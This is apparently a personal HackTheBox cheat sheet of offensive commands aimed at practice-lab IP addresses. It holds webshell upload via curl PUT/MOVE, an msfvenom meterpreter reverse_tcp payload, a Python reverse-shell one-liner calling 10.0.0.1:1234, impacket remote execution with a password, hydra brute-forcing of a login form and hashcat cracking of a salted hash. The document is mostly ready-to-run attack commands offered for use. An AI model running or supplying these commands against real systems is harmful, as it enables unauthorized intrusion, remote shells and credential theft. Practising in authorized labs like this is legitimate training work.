# htb cheat sheet

## vi
:w !sudo tee %

## directory busting
nikto -host 10.10.10.68
gobuster dir --url 10.10.10.68 --wordlist /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 


## CURL
curl -X PUT -T /usr/share/webshells/aspx/cmdasp.aspx "http://10.10.10.15/sh.aspx"`
curl -X MOVE -H "Destination: http://10.10.10.15/sh.aspx" http://10.10.10.15/sh.txt



## msfvenom
msfvenom -p windows/meterpreter/reverse_tcp lhost=10.10.14.8 lport=5577 -f aspx



## msfconsole
search suggester
use exploit/multi/handler
sessions 1


## impacket
impacket-wmiexec pentest:"P3nT3st!"@10.10.10.152

## Linux writeable directories
/dev/shm
/tmp


## Linux enumeration
LinEnum.sh

## reverse shells
Pentestmonkey reverse shell cheat sheet
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
payloadallthethings swisskyrepo

## upgrade shells 
upgrading simple shells ropnop blog
python -c 'import pty; pty.spawn("/bin/bash")'
stty raw -echo  # disables visible input, so fg has to be typed blind 
fg	


## hydra
export HYDRA_PROXY=connect://127.0.0.1:8080
hydra -l admin -P /opt/SecLists-master/Passwords/xato-net-10-million-passwords-10000.txt -s 80 "http-form-post://10.10.10.191/admin/:&username=^USER^&password=^PASS^:Username or password incorrect"  

## gobuster
gobuster dir -u 10.10.10.191 -w /opt/SecLists-master/Discovery/Web-Content/common.txt -x .php,.html,.txt

## metasploit
edit 			# edit current exploit
reload 			# reload exploit after edit

## hashcat
hashcat -m 110 -a 0 hash:salt --username test_user /usr/share/wordlists/rockyou.txt   # crack salted sha1 hash